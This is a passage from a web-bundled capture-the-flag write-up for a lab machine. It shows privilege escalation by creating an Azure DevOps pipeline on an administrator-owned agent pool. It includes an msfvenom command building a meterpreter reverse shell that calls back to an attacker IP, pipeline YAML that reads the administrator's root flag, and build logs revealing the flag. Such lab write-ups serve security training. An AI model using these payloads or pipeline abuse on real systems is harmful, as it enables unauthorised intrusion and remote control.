with name Default. The pool does not exist or has not been authorized for use.\n")),(0,r.kt)("p",null,"Going to ",(0,r.kt)("a",{parentName:"p",href:"http://devops.worker.htb/ekenas/PartsUnlimited/_settings/agentqueues"},"http://devops.worker.htb/ekenas/PartsUnlimited/_settings/agentqueues"),"\nI was there was an Agent pool named ",(0,r.kt)("inlineCode",{parentName:"p"},"Setup")," that was owner by the administrator."),(0,r.kt)("p",null,"So I changed my template to the following and created a new pipeline:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-yaml"},"# Starter pipeline\n# Start with a minimal pipeline that you can customize to build and deploy your code.\n# Add steps that build, run tests, deploy, and more:\n# https://aka.ms/yaml\n\ntrigger:\n- master\n\npool: 'Setup'\n\nsteps:\n- script: C:\\Users\\robisl\\Downloads\\cyfun.exe\n  displayName: 'cyfun'\n")),(0,r.kt)("p",null,'Here is the execution of the pipeline task "cyfun":'),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'##[section]Starting: cyfun\n==============================================================================\nTask         : Command line\nDescription  : Run a command line script using Bash on Linux and macOS and cmd.exe on Windows\nVersion      : 2.151.1\nAuthor       : Microsoft Corporation\nHelp         : https://docs.microsoft.com/azure/devops/pipelines/tasks/utility/command-line\n==============================================================================\nGenerating script.\nScript contents:\nC:\\Users\\robisl\\Downloads\\cyfun.exe\n========================== Starting Command Output ===========================\n##[command]"C:\\Windows\\system32\\cmd.exe" /D /E:ON /V:OFF /S /C "CALL "w:\\agents\\agent11\\_work\\_temp\\31fb30ee-8d29-41e3-9ab0-529b331cef0e.cmd""\n##[error]This version of C:\\Users\\robisl\\Downloads\\cyfun.exe is not compatible with the version of Windows you\'re running. Check your computer\'s system information and then contact the software publisher.\n##[error]Cmd.exe exited with code \'1\'.\n##[section]Finishing: cyfun\n')),(0,r.kt)("p",null,"Seems to be the wrong architecture."),(0,r.kt)("p",null,"So I created a 32 bits reverse shell instead of a 64 bits one:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows --encoder generic/none LHOST=10.10.14.174 LPORT=9999 -f raw > cyfun.exe\nFound 1 compatible encoders\nAttempting to encode payload with 1 iterations of generic/none\ngeneric/none succeeded with size 341 (iteration=0)\ngeneric/none chosen with final size 341\nPayload size: 341 bytes\n")),(0,r.kt)("p",null,"Same error again, ok let's forget the shell, let's just display the root\nflag."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-yaml"},"trigger:\n- master\n\npool: 'Setup'\n\nsteps:\n- script: type C:\\Users\\Administrator\\Desktop\\root.txt\n  displayName: 'cyfun'\n")),(0,r.kt)("p",null,"Here are the logs of our pipeline task build:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'##[section]Starting: cyfun\n==============================================================================\nTask         : Command line\nDescription  : Run a command line script using Bash on Linux and macOS and cmd.exe on Windows\nVersion      : 2.151.1\nAuthor       : Microsoft Corporation\nHelp         : https://docs.microsoft.com/azure/devops/pipelines/tasks/utility/command-line\n==============================================================================\nGenerating script.\nScript contents:\ntype C:\\Users\\Administrator\\Desktop\\root.txt\n========================== Starting Command Output ===========================\n##[command]"C:\\Windows\\system32\\cmd.exe" /D /E:ON /V:OFF /S /C "CALL "w:\\agents\\agent11\\_work\\_temp\\d9359887-a4ac-49ad-9865-3e9b9024f109.cmd""\nc8d6aeda24c4e17abcc72f26dedbe919\n##[section]Finishing: cyfun\n')))}m.isMDXComponent=!0},67563:(e,n,t)=>{t.d(n,{Z:()=>s});const s=t.p+"assets/images/worker-506d70d3eb9afbc43f78c0c5c86a34e3.png"}}]);